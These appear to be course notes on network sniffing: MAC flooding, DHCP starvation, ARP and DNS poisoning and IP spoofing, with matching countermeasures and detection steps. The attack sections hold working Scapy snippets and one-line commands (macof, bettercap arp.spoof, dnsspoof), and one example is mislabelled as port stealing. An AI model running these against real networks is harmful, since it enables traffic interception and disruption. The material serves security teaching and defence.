# Sniffing

> #TLDR
> Sniffing enables attackers to monitor network traffic and capture sensitive information. Through various sniffing techniques, such as MAC attacks, DHCP attacks, and ARP poisoning, attackers compromise data security. Defense involves encryption, segmentation, port security, and vigilant monitoring.

---

## **What We Get From This Exercise**
###### #Objectives #Sniffing

- **Understand Sniffing Fundamentals**: Gain insights into sniffing concepts and how sniffers operate within different network environments (hub vs. switch).
- **Identify Key Sniffing Techniques**: Learn and observe various sniffing attacks, including MAC flooding, ARP poisoning, and DNS poisoning.
- **Gain Hands-On Experience with Sniffing Tools**: Explore popular sniffing tools like Wireshark, tcpdump, Ettercap, and Scapy, understanding their specific use cases and applications.
- **Implement and Test Countermeasures**: Learn how to defend against sniffing attacks by configuring port security, setting static ARP entries, using encrypted protocols, and segmenting network traffic.
- **Develop Detection and Monitoring Skills**: Use detection tools and monitoring techniques to identify sniffing attempts, utilizing tools like Snort, arpwatch, and SNMP traps for real-time alerting.
- **Understand Real-World Implications**: Connect these concepts to real-world network security and data protection, highlighting the importance of encryption and monitoring in maintaining a secure network environment.

---

### **Table of Contents**

1. [Objectives](#objectives)
2. [Introduction](#introduction)
3. [Sniffing Concepts](#sniffing-concepts)
4. [Types of Sniffing](#types-of-sniffing)
5. [Sniffing Attacks](#sniffing-attacks)
	1. [MAC Attacks](#mac-attacks)
	2. [DHCP Attacks](#dhcp-attacks)
	3. [ARP Poisoning](#arp-poisoning)
	4. [Spoofing Attacks](#spoofing-attacks)
	5. [DNS Poisoning](#dns-poisoning)
6. [Sniffing Tools](#sniffing-tools)
7. [Countermeasures Against Sniffing](#countermeasures-against-sniffing)
8. [Detection Techniques](#detection-techniques)
9. [Practical Exercises](#practical-exercises)
10. [Summary](#summary)

---

### **1. Objectives**

- **Describe sniffing concepts**: Understand sniffing and its role in network attacks.
- **Explain different MAC attacks**: Recognize techniques such as MAC flooding and switch port stealing.
- **Explain different DHCP attacks**: Understand DHCP starvation and rogue server attacks.
- **Describe ARP poisoning**: Comprehend ARP spoofing and its impact on network security.
- **Explain different spoofing attacks**: Know various methods of device and user impersonation.
- **Describe DNS poisoning**: Explore methods of redirecting DNS requests to malicious IP addresses.
- **Apply a defense mechanism against various sniffing techniques**: Use network protection strategies.
- **Use different sniffing tools**: Leverage tools like Wireshark, tcpdump, and others.
- **Apply various sniffing countermeasures**: Configure systems to avoid sniffing vulnerabilities.
- **Apply various techniques to detect sniffing attacks**: Monitor network traffic for sniffing attempts.

---

### **2. Introduction**

Sniffing is a technique used in ethical hacking and malicious attacks to intercept network packets for analysis. By exploiting network vulnerabilities, attackers use sniffing to collect unencrypted information across wired and wireless networks. Sniffing works on both hub and switch-based networks, although sniffers must deploy active techniques to bypass switches.

---

### **3. Sniffing Concepts**

Sniffing involves setting the **Network Interface Card (NIC)** to **promiscuous mode** to capture all traffic. This allows attackers to intercept, monitor, and decode network packets, which may contain sensitive information. Sniffers work on the **data link layer** (Layer 2) of the OSI model, capturing traffic on the network segment.

- **Example Code**: Using Scapy in Python to capture packets.
  ```python
  from scapy.all import *

  def packet_callback(packet):
      if packet.haslayer(TCP):
          print(packet.show())  # Display captured packet details

  # Start sniffing
  sniff(prn=packet_callback, count=10)  # Capture 10 packets
  ```

- **Tools for Sniffing Concepts**:
  - **Wireshark**: For capturing and analyzing packets.
  - **tcpdump**: Command-line packet capture tool.
  - **Scapy**: Python library for packet crafting and sniffing.

---

### **4. Types of Sniffing**

#### **Passive Sniffing**
- Passive sniffing captures traffic without injecting packets into the network. It works effectively in a **hub-based** network environment.
  
  **Example**:
  ```shell
  tcpdump -i eth0 -n
  ```
  This command captures packets on `eth0` without altering them, providing details on the source and destination IP addresses.

#### **Active Sniffing**
- Active sniffing manipulates the network environment to capture packets in **switch-based** networks, typically using **ARP poisoning** or **MAC flooding**.
  
  **Example Code for ARP Poisoning**:
  ```python
  from scapy.all import *

  def arp_poison(target_ip, target_mac, gateway_ip):
      poison_packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
      send(poison_packet, verbose=False)

  target_ip = "192.168.1.5"
  target_mac = "00:0a:95:9d:68:16"
  gateway_ip = "192.168.1.1"
  arp_poison(target_ip, target_mac, gateway_ip)
  ```
  
  **Tools**:
  - **Ettercap**: For ARP poisoning and MITM attacks.
  - **Bettercap**: Modern tool for network attacks, ARP poisoning, and spoofing.

---

### **5. Sniffing Attacks**

#### **MAC Attacks**

**MAC Flooding**: Overloads a switch with fake MAC addresses, forcing it to act as a hub.
- **Example Tool**: `macof` from `dsniff` suite
  ```shell
  macof -i eth0  # Floods the network with random MAC addresses
  ```

**Switch Port Stealing**: Sniffs packets by stealing the target’s MAC address.
- **Example Code**: Python using `scapy`.
  ```python
  from scapy.all import *

  def mac_flood(interface="eth0"):
      while True:
          sendp(Ether(src=RandMAC(), dst="ff:ff:ff:ff:ff:ff")/ARP(op=2), iface=interface)

  mac_flood()
  ```

#### **DHCP Attacks**

**DHCP Starvation**: Exhausts DHCP IP leases to block legitimate users.
- **Example Tool**: `dhcpstarv.py` from GitHub.
  ```shell
  python dhcpstarv.py -i eth0
  ```

**Rogue DHCP Server**: Attacker sets up a fake DHCP server, directing victims to a malicious gateway.
  
#### **ARP Poisoning**

ARP poisoning misleads a network’s ARP cache, allowing the attacker to intercept traffic.
- **Example with `Bettercap`**:
  ```shell
  sudo bettercap -iface eth0 -eval "arp.spoof on"
  ```

#### **Spoofing Attacks**

Spoofing manipulates network traffic by impersonating a legitimate address.
- **Example**: Using `scapy` to spoof IP.
  ```python
  from scapy.all import *

  packet = IP(src="192.168.1.1", dst="192.168.1.5")/TCP(dport=80)
  send(packet)
  ```

#### **DNS Poisoning**

DNS poisoning redirects users to malicious websites by altering DNS mappings.
- **Example Tool**: `dnsspoof` from `dsniff` suite.
  ```shell
  dnsspoof -i eth0
  ```

---

### **6. Sniffing Tools**

| Tool                 | Function                                                                                                   |
|----------------------|------------------------------------------------------------------------------------------------------------|
| **Wireshark**        | Packet capture and analysis with graphical interface.                                                      |
| **tcpdump**          | Command-line packet capture, ideal for quick captures and initial analysis.                                |
| **Cain & Abel**      | Windows tool with features for ARP spoofing and password cracking.                                         |
| **macof**            | Generates fake MAC addresses to flood a switch’s CAM table.                                                |
| **Ettercap**         | Advanced tool for network MITM attacks, supports sniffing and ARP poisoning.                               |
| **Bettercap**        | Comprehensive suite for MITM attacks, sniffing, and network analysis in a modern environment.              |

---

### **7. Countermeasures Against Sniffing**

To protect networks from sniffing attacks, implement the following:

- **Encrypted Protocols**: Replace HTTP, Telnet, and FTP with HTTPS, SSH, and SFTP to encrypt data.
- **Port Security**: Set limits on the number of MAC addresses allowed on each port to prevent MAC flooding.
- **Static ARP Entries**: Manually assign ARP entries for critical systems, making ARP poisoning

 ineffective.
- **Virtual LANs (VLANs)**: Segment network traffic to limit sniffing to specific zones.

**Example Cisco Configuration**:
```shell
switchport mode access
switchport port-security
switchport port-security maximum 1
switchport port-security violation restrict
```

**Tools for Defense**:
- **Snort**: Open-source IDS for monitoring and alerting on suspicious traffic patterns.
- **Fail2Ban**: Protects against brute force attacks and unauthorized access by blocking suspicious IPs.
- **Firewall Rules**: Block all unnecessary traffic and allow only trusted sources.

---

### **8. Detection Techniques**

To detect sniffing attempts:

- **ARP Monitoring**: Use tools like `arpwatch` to log and alert on ARP table changes.
  ```shell
  sudo arpwatch -i eth0
  ```

- **Intrusion Detection Systems (IDS)**: Set up an IDS like Snort to alert on anomalous activity such as ARP floods or DNS spoofing attempts.

- **SNMP Traps**: Configure network switches with SNMP traps to send alerts on port security violations.

---

### **9. Practical Exercises**

#### **Exercise 1: Simulating a MAC Flooding Attack**

**Objective**: Understand the process and impact of a MAC flooding attack.

- **Step 1**: Install `dsniff` suite with `macof`.
- **Step 2**: Run `macof -i [interface]` to flood the network switch with fake MAC addresses.
- **Expected Result**: Observe switch behaviour as it switches from a dedicated mode to a hub mode, broadcasting packets.

#### **Exercise 2: Setting Up ARP Spoofing Defense**

**Objective**: Defend against ARP spoofing by implementing static ARP tables and monitoring.

- **Step 1**: Configure static ARP entries for critical systems.
- **Step 2**: Install and configure `arpwatch` to monitor ARP changes.
- **Expected Result**: Attempt an ARP spoofing attack and verify the network remains unaffected by observing ARP table stability.

---

### **10. Summary**

Sniffing is a common tactic in network attacks, aiming to capture unencrypted information and manipulate network communications. Techniques like MAC flooding, ARP poisoning, DHCP starvation, and DNS poisoning enable attackers to intercept and redirect traffic. To counter these threats, organizations should deploy encryption, enforce strict port security, use network segmentation, and monitor network activity closely. Detection and prevention require a combination of proactive network configurations, vigilant monitoring, and awareness of sniffing methods. Properly configured security can greatly reduce vulnerability to sniffing, securing sensitive data across the network.